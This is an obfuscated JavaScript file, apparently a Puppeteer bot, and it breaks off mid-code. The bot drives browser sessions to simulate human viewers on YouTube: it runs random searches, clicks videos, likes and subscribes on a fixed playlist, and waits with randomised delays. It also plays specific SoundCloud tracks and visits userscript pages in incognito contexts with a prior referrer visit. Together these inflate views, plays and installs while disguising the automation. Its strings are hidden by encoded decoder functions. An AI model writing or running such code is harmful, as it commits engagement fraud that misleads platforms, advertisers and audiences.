const a0 = c,
  Z = b,
  Y = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x6d * 0x1f + 0x1 * -0x1dfe + -0x733 * -0x6))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x63 * -0x19 + -0x7 * -0x2c5 + -0x1d0e), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xd87d + 0x98 * -0x153 + 0x1 * 0x216f5 + (-0x45ae + 0x60ea + 0x1f5c) * random()) : await standardWaitForNetIdle(f), await wait(-0x2481 + -0x21e9 + 0x2 * 0x2cf9 + (-0x210 + 0x30fa + 0x1 * -0x7da) * random()), 0x101f + 0x56 * 0x56 + 0x2 * -0x1681;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xc * -0x45 + -0xd44 + -0x2 * -0xec8), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xd * 0x12 + 0x5c * -0xb + 0x30b;
}
async function randomWait() {
  return await wait(-0x1d71 + -0x2 * -0x13d + 0x1 * 0x2e7f + (0x1521 + -0x1cb2 + 0x1b19) * random()), -0x1 * -0x2624 + -0x1bba + 0xa69 * -0x1;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * 0xb1d + 0x186c + -0xd4f);
    let h = e[f];
    if (b['AXtWsw'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x6 * 0x30d + -0x266a + 0x141c, s, t, u = 0xc28 * -0x2 + -0x2a3 + 0x1af3; t = n['charAt'](u++); ~t && (s = r % (-0x6d * 0x1f + 0x1 * -0x1dfe + -0xe67 * -0x3) ? s * (-0x63 * -0x19 + -0x7 * -0x2c5 + -0x1cce) + t : t, r++ % (-0x2415 + 0x4c * -0x71 + 0x9 * 0x7bd)) ? p += String['fromCharCode'](-0x173a + 0x204e + -0x815 & s >> (-(-0x2481 + -0x21e9 + 0x1 * 0x466c) * r & -0x108 + 0x187d + 0x1 * -0x176f)) : 0x101f + 0x56 * 0x56 + 0x3 * -0xf01) {
          t = o['indexOf'](t);
        }
        for (let v = -0xc * -0x45 + -0xd44 + -0x2 * -0x504, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xd * 0x12 + 0x5c * -0xb + 0x31a))['slice'](-(-0x1d71 + -0x2 * -0x13d + 0x5 * 0x565));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1521 + -0x1cb2 + 0x791,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * -0x2624 + -0x1bba + 0xa6a * -0x1; u < 0x1bb * -0x1 + -0x1 * -0xb95 + -0xce * 0xb; u++) {
          p[u] = u;
        }
        for (u = 0x15ee + 0x7 * -0x43f + 0x7cb; u < -0x7 * 0x347 + -0x23b * -0xf + -0x984; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x10be * -0x1 + -0xa75 * 0x3 + -0xb * -0x477), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1912 + 0xcbd + 0xc55, q = -0x751 * -0x1 + -0x2 * 0xadf + 0xe6d;
        for (let v = -0x6 * 0x29 + -0xe4b * -0x1 + -0xd55; v < n['length']; v++) {
          u = (u + (0xecb + 0x215e + -0x3028)) % (-0xcdd + -0x3 * 0xbcb + 0x313e), q = (q + p[u]) % (-0x1835 + -0x2339 + 0xdd * 0x46), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xa * 0x257 + -0x38d * -0x2 + 0x1 * -0x1d80)]);
        }
        return t;
      };
      b['FOBWdx'] = m, c = arguments, b['AXtWsw'] = !![];
    }
    const j = e[0xf83 * 0x2 + 0x1 * 0x44b + -0x2351 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['hZtrqc'] === undefined && (b['hZtrqc'] = !![]), h = b['FOBWdx'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1bb * -0x1 + -0x1 * -0xb95 + -0xc2 * 0xd, 0x15ee + 0x7 * -0x43f + 0x7d2), i[Math['floor'](Math['random']() * i['length'])])[R(0xd) + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xb8 * 0x17f + -0x70b * -0x39 + 0x6c35) * getRandomInt(0x10be * -0x1 + -0xa75 * 0x3 + -0x61 * -0x7f, -0x1912 + 0xcbd + 0xc5a), h)), -0x751 * -0x1 + -0x2 * 0xadf + 0xe6e;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x6 * 0x29 + -0xe4b * -0x1 + -0xd55;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xecb + 0x215e + -0x3028]['split']('\x20');
    for (let k = -0xcdd + -0x3 * 0xbcb + 0x303e; k < i['length']; k += -0x1835 + -0x2339 + 0x27a * 0x18)
      j += i[k] * h[i[k + (0xa * 0x257 + -0x38d * -0x2 + 0x1 * -0x1e7f)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xf83 * 0x2 + 0x1 * 0x44b + -0x2b7 * 0xd)['map'](l => Array['from'](l['children']))['flat'](0x1057 * 0x2 + 0xee3 + -0x2f90)['map'](l => l['childNodes'][-0x2 * 0xbca + 0x21dd * -0x1 + 0x3972]['childNodes'][0x43 * -0x52 + -0x1fae + 0x3524]['childNodes'][0x1519 + -0x9c1 + 0x1 * -0xb57]['childNodes'][-0x1 * -0x12a3 + 0x4e * 0x4c + -0x29cb]['childNodes'][-0xcfe + -0x1 * -0x1d23 + 0x1 * -0x1024]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x11ac + 0x3 * 0x183 + 0x110b, 0x144c + -0x1 * -0x1901 + -0x19c5)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x37df * 0x2 + -0x1c48 + 0xc6f * -0x2);
  const h = await getMaxTime(f),
    i = Math['min']((-0xe3cb + 0x287 * -0x35 + 0x2541e) * getRandomInt(0xe9 + 0xc94 + 0x1d * -0x77, -0x133b + -0x39e * 0x4 + -0x68 * -0x53), h);
  return await wait(i), -0x1172 + 0xfca * -0x1 + 0x7f * 0x43;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))[S(0xc, 'R1Ca')](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x29f + 0x461 + -0x700]['children'][-0xd76 + 0x52f * 0x1 + -0xa3 * -0xd]['children'][0x163c * -0x1 + -0x144c + 0x1 * 0x2a88]['children'][0x644 + -0x1 * 0x1bcb + 0x3 * 0x72d]['children'][-0x177b * -0x1 + -0x273 * -0x1 + -0x19ee]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x255b + 0x1b * 0xd3 + -0x3b9b;
}

function a() {
  const bq = [
    'zs95B3v0DwjLlG',
    'zxYjTTXc-J',
    'wxHXyMTnAtfjCW',
    'enuserjs.o',
    'zCo7W4RdGSkHWRbyW4eIFa',
    'z8oUWONcLCo6W68',
    'e/youtube.',
    'C0j5vgfNtMfTzq',
    'W4SwdaJcK8ocymoFFqO',
    'ai-wave-ii',
    'ec-touch-f',
    'pts/by-sit',
    'B8kfW7eVz8kf',
    'C2v0qxr0CMLIDq',
    'object',
    'https://ww',
    'close',
    'lwfNyxiTAw8TCW',
    'Aw5HBgX5lw1LDa',
    'j_fe6PfxW4',
    'BgvHBNvWigLUDa',
    'WRlcR8oaW5/cNJKbECoqiq',
    'easyfork.o',
    '9ACSDN%E5%',
    'W5zjW6xcH8o3WP3dTSkbrmo6',
    'WR3dQMldHSoxwWRcNJ5W',
    'ange;v=b3;',
    'sapp/cinem',
    'kKr0rmktnsdcTHrg',
    '?si=20d1c3',
    'FuPVf85zMi',
    'ienOCM9Tzs8Xma',
    'Mozilla/5.',
    'mrbeast,mr',
    'WR4mW5DYohWJWQdcHxe'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x70 * -0x55 + -0x1 * -0xb5 + -0x1 * -0x24df + (-0x1f * 0xf4 + -0x240a + 0x41c8) * random()
  }), await wait(-0xda0 * 0x1 + 0x15c6 + 0x632 * -0x1 + (-0x9 * -0x26a + 0x1753 + -0x2be1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const T = c;
    if (!await f['evaluate'](() => Array['from'](document['getElement' + T(0x7)]('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const U = b,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x696 + -0x89b * -0x4 + -0x1bd4]['childNodes'][-0x1387 * -0x1 + 0x57d * -0x5 + 0x7eb]['childNodes'][-0x116a + -0x383 + -0x72 * -0x2f]))[Math['floor'](Math[U(0x5, 'A2nW')]() * m['length'])];
    var m;
    const n = l['childNodes'][0x1170 + -0x1ce5 + -0x1 * -0xb7a]['childNodes'][-0x26 * -0x97 + -0x264 * 0xa + -0x1 * -0x17e]['childNodes'][0x2184 + 0x1 * 0x2389 + 0x23 * -0x1f9]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x106f + -0x1 * -0x12a9 + -0x239),
          r = -0x1 * -0x129e + 0x10f9 + -0x2397;
        for (let u = -0x3c7 + 0x958 + -0x591; u < q['length']; u += -0x3fd + 0x2 * 0x115d + -0x1ebb * 0x1)
          r += q[u] * k[q[u + (-0x79a + 0x1bc4 + -0x1429)]];
        return r;
      }(n);
  });
  await wait((-0x2b7 + -0xb3 * 0x62 + 0x81d5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x16863 + 0x5e * -0x4b7 + 0x1 * 0x13d2f) * getRandomInt(0x7bd * -0x1 + -0x5 * 0x632 + 0xb1 * 0x38, -0x259d * -0x1 + 0x53 * 0x65 + -0x4652), h + (0xe9d + 0x29a + 0x1 * 0x251));
  return await wait(i), -0xc92 + -0x1341 * 0x2 + 0x3315;
}
async function keyWatch(f) {
  const V = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x193a + -0x1e99 + -0x1 * -0x37d3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + V(0xa) + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const W = c;
    log('executed\x20c' + W(0x14) + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x15 * 0x1a3 + -0x117f + 0x6 * 0xa99 + (-0xf * -0x4f + -0x3e5 * 0x1 + -0x2 * -0x196) * Math['random']());
    });
  }, -0x1911 + 0x9 * -0x32d + 0x50fe);
  await wait(-0x21b6 * 0x1 + 0x3f4e6 + 0xc0b0);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xe924 + -0x4 * -0x2dc4 + 0x11c74) * getRandomInt(0x15e2 + -0x85c + 0xb6 * -0x13, -0x1 * 0x893 + 0x1 * 0x1be6 + -0x133a)), clearInterval(h), 0x1f2c + 0xcb4 + 0x3fd * -0xb;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xab9 + 0x197f * -0x1 + 0xec6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xb77 + -0x215a + -0x2 * -0xaf2;
    await randomWait();
  }
  return 0x8eb + 0x2 * -0x5e6 + 0x2e2;
}

function fetchRandomSC() {
  const X = d;
  return Math['random']() <= -0x2624 * -0x1 + -0x85f + -0x1dc5 * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2 * -0x58f + 0x21 * -0x7b + 0x4bd + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + X(0x1d) + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * 0xb1d + 0x186c + -0xd4f);
    let h = e[f];
    if (c['yBUvuf'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x6 * 0x30d + -0x266a + 0x141c, r, s, t = 0xc28 * -0x2 + -0x2a3 + 0x1af3; s = m['charAt'](t++); ~s && (r = q % (-0x6d * 0x1f + 0x1 * -0x1dfe + -0xe67 * -0x3) ? r * (-0x63 * -0x19 + -0x7 * -0x2c5 + -0x1cce) + s : s, q++ % (-0x2415 + 0x4c * -0x71 + 0x9 * 0x7bd)) ? o += String['fromCharCode'](-0x173a + 0x204e + -0x815 & r >> (-(-0x2481 + -0x21e9 + 0x1 * 0x466c) * q & -0x108 + 0x187d + 0x1 * -0x176f)) : 0x101f + 0x56 * 0x56 + 0x3 * -0xf01) {
          s = n['indexOf'](s);
        }
        for (let u = -0xc * -0x45 + -0xd44 + -0x2 * -0x504, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xd * 0x12 + 0x5c * -0xb + 0x31a))['slice'](-(-0x1d71 + -0x2 * -0x13d + 0x5 * 0x565));
        }
        return decodeURIComponent(p);
      };
      c['dVsGgr'] = i, b = arguments, c['yBUvuf'] = !![];
    }
    const j = e[0x1521 + -0x1cb2 + 0x791],
      k = f + j,
      l = b[k];
    return !l ? (h = c['dVsGgr'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1f2d * -0x1 + -0x79f * -0x1 + 0x178e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x176d + 0x124c + -0x3cb * 0xb;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x39 * -0x257 + 0x10 * -0x81b + 0x1b6d7 + getRandomInt(-0x2 * 0x213b + 0x5de0 + 0x1f2e, 0xd09 + 0x9f55 + -0x372e));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xffe + 0x1a59 * 0x1 + 0x109 * -0xa), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * -0x1520 + 0x466 * 0x1 + 0x10ba;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x37 * -0x9d + -0x5ed + 0x27a8, -0x1053 + -0x59 * -0x4 + 0x50b * 0x3)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xfda + -0x1 * -0x2527 + -0xd7d + floor((0x1e0b + 0x53c + -0x3 * 0xa75) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2 * -0x7a881951 + 0x1181e511 * -0xc + 0xd3db * 0x2c0aa),
          -0x23 * 0x1c29f + -0x14072 * 0x76 + 0x1515049,
          -0x79c4 + 0x3fc9 + 0xb9fb,
          0x42 + -0x23cb + 0x2409
        ], y = [
          -0x87 * 0x35 + -0x1f2e + -0x1 * -0x3b39,
          0x7 * -0x22b + -0x23af + 0x32ec,
          0x12e1 * -0x1 + -0x1862 + 0x2b4b,
          0xf2b * -0x1 + 0x748 + 0x2a1 * 0x3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x2 * 0xbb + 0x3cd + 0x2a1 * -0x2)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x216d + 0x235c + 0x1 * -0x44c9; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * 0x24f + 0xa9 * -0x22 + -0x1423 * -0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x3 * -0xc65 + 0x1 * 0x2ef + -0x1 * -0x2240] = A[-0x8 * 0x322 + 0x1b03 + -0x1e3] = A[-0x10 * 0x26 + 0xd * -0x45 + -0x2f1 * -0x2] = A[0x1b97 + 0x4 * 0x567 + 0x707 * -0x7] = A[0x315 * 0x8 + -0x921 + -0xf84] = A[0x122 * -0xc + -0xa69 * 0x1 + -0x2b * -0x8f] = A[0x1a * 0x92 + -0x7 * 0x85 + -0xb2c] = A[0x80d + -0x25bb * -0x1 + 0x2 * -0x16e1] = A[-0x23ec + 0x19b8 + 0xa3b] = A[-0x1 * -0x1119 + -0x1 * -0x7a + -0x5d9 * 0x3] = A[0x10d * -0xd + -0x317 * -0x2 + 0x25 * 0x34] = A[0x1b31 + -0xb2f * -0x2 + -0x3185 * 0x1] = A[-0x1 * 0x1bef + -0x359 * 0x2 + 0x22ac] = A[-0x145 * 0x10 + 0x1421 * -0x1 + -0x819 * -0x5] = A[-0x1485 + 0x1dea + -0x1 * 0x958] = A[-0x435 + 0x1a * 0xc1 + -0x33 * 0x4d] = A[-0x1767 * -0x1 + -0x54a * -0x2 + -0x21ec] = 0x1cce + -0xb7 + 0x1a7 * -0x11, this['blocks'] = A) : this['blocks'] = [
                0x13f4 + 0x132d * -0x1 + -0xc7,
                -0x1c9 * -0x1 + 0x5 * 0x71 + -0x3fe,
                -0x1bd7 + -0xb74 + 0x274b,
                -0xebc + -0x8 * 0x331 + 0x2844,
                0x1884 + 0xeaf + -0x2733,
                -0x10fd * 0x1 + -0x1 * 0x1bd9 + 0x2cd6,
                0x1868 + 0x780 + -0x1fe8,
                0x2482 + -0x2 * 0x799 + 0x155 * -0x10,
                0x3c2 + -0x192a + 0x1568,
                -0x23ef * -0x1 + -0x9b7 * 0x4 + 0x7 * 0x6b,
                0x13f3 + 0x9 * 0x180 + 0x1 * -0x2173,
                0x9cc + 0x11 * -0x11f + 0x943,
                -0x506 + -0x4f6 * -0x2 + -0x4e6,
                -0x5 * 0x5c + -0x14b * 0x1 + 0x317,
                -0x1d4c + -0x3ec * 0x1 + 0x2138,
                0xc54 + -0xa * -0x2c6 + -0x2810,
                -0x4f4 + 0x997 * -0x1 + 0xe8b
              ], this['h0'] = 0xcb32abd7 * -0x1 + 0xb8ec3 * 0x91c + 0x130c0e4 * 0xa9, this['h1'] = 0x160b1b6ef + 0x14899727d + -0x1b97d7de3, this['h2'] = -0xa4155 * 0x76 + -0xa2d15 * 0x28d + 0xb769f8bd, this['h3'] = 0x19 * -0x116c876 + -0x1bb54b40 + 0x4721333c, this['h4'] = -0x149c3676 + 0x10 * -0x164222f7 + 0x23c9147d6, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1706 + 0x1276 + -0x297c, this['finalized'] = this['hashed'] = 0x9c + 0x1880 + -0x191c, this['first'] = -0xa39 * -0x3 + -0x1 * 0x901 + -0x15a9 * 0x1;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1ad * -0xa + -0xf49 + -0x200b * -0x1, O = J['length'] || -0xb1 * -0x1d + 0x13 * 0xb5 + -0x217c, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xf37 + -0x703 * -0x5 + -0x13d8, P[0x1647 + -0x8 * 0x313 + -0x1 * -0x251] = this['block'], P[-0x6 * -0x3ea + 0x18b3 + -0x301f] = P[0x1769 * 0x1 + 0x2a2 * -0x4 + 0x1 * -0xce0] = P[0x13ae + 0x4 * 0x70b + -0x2fd8] = P[-0xed + -0x48 + 0x138] = P[-0xcac + -0xa4b + 0x1 * 0x16fb] = P[0x20ff * -0x1 + 0x1288 + -0x9 * -0x19c] = P[-0x1 * 0xf31 + 0xfb4 + 0x1 * -0x7d] = P[-0xea8 + 0x1995 + -0x1f * 0x5a] = P[-0x1585 + 0x18b5 + -0x8 * 0x65] = P[-0x23dd * -0x1 + -0x2583 + 0x1af] = P[-0x1027 + -0x1f9 * 0x4 + -0x9 * -0x2ad] = P[0x1711 + 0x10e3 + -0x27e9] = P[-0x193f + 0x1b * -0x141 + 0xe2 * 0x43] = P[0x1b48 + -0x1a05 + -0xa * 0x1f] = P[0x264 * -0xa + 0x1069 + 0x78d] = P[0xa9b + 0x7c3 + -0x124f] = 0x9 * -0x301 + -0x5 * 0x616 + 0x2f * 0x139), K) {
                    for (N = this['start']; M < O && N < -0x1 * 0x4a9 + 0x196 * -0x17 + 0x2963; ++M)
                      P[N >> 0xf80 + -0xd * 0x263 + -0x1 * -0xf89] |= J[M] << y[0x2 * -0x44f + 0x1441 + -0xba0 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x100a + 0x9e9 * 0x1 + 0x99 * -0x2b; ++M)
                      (L = J['charCodeAt'](M)) < -0x1d * 0x107 + -0x20b5 * -0x1 + 0x1 * -0x26a ? P[N >> -0x2c * -0x50 + -0x7f * 0x49 + 0x1679] |= L << y[-0xca9 + -0x4cd * 0x5 + -0xe5 * -0x29 & N++] : L < 0x1d * 0x26 + 0xdb * -0x1 + 0x48d ? (P[N >> -0x1 * 0x1843 + -0x922 + 0x1 * 0x2167] |= (0x26b0 + -0x3b * 0x17 + -0x20a3 * 0x1 | L >> -0x18c0 + -0x190 * 0x11 + 0x2 * 0x19ab) << y[-0xd84 + -0x1308 + 0x5 * 0x683 & N++], P[N >> -0x1d78 + 0x7 * -0x141 + 0x2641] |= (-0x103 * 0x1 + -0x2323 + 0x24a6 | -0x4c7 * -0x2 + 0x2 * 0x90b + -0x1b65 * 0x1 & L) << y[-0xe5 * 0x1 + 0x762 + -0x67a & N++]) : L < 0xf391 * 0x1 + -0x178c9 + 0x95 * 0x258 || L >= 0x5 * 0x7ed + 0x1f3 * 0x8f + -0x5e * 0x101 ? (P[N >> 0x2 * 0x10f4 + -0x813 + -0x19d3 * 0x1] |= (-0x2032 + 0x1 * -0x17b3 + 0x38c5 | L >> -0x1826 + 0x1845 + -0x13) << y[-0x5c6 + -0x2454 + 0x2a1d & N++], P[N >> -0x25 * -0x5b + -0x20 * -0xc + 0x1 * -0xea5] |= (-0x6af + -0x12 * -0x171 + -0x12c3 | L >> -0x5 * 0x74 + 0x8f8 + -0x6ae & 0x1236 + 0x124d + 0x1a6 * -0x16) << y[-0x2184 + 0x1 * 0x1732 + 0xa55 & N++], P[N >> -0x237c + -0x48d + 0x280b] |= (-0x227b + -0x21f + 0x251a | 0x226a + -0x1 * 0x2138 + -0xf3 * 0x1 & L) << y[-0x9cc + 0xb * -0x9d + 0x108e & N++]) : (L = -0x3 * -0x13b1 + -0x1 * -0xd8e + 0xb75f + ((0x22fb + 0x11 * -0x1c9 + -0x1 * 0xa3 & L) << -0x600 + 0xee * 0x1c + 0x13fe * -0x1 | -0x1d08 + 0xd5a * -0x2 + 0x3bbb & J['charCodeAt'](++M)), P[N >> -0x1775 + -0x1bb3 * 0x1 + 0x4a * 0xb1] |= 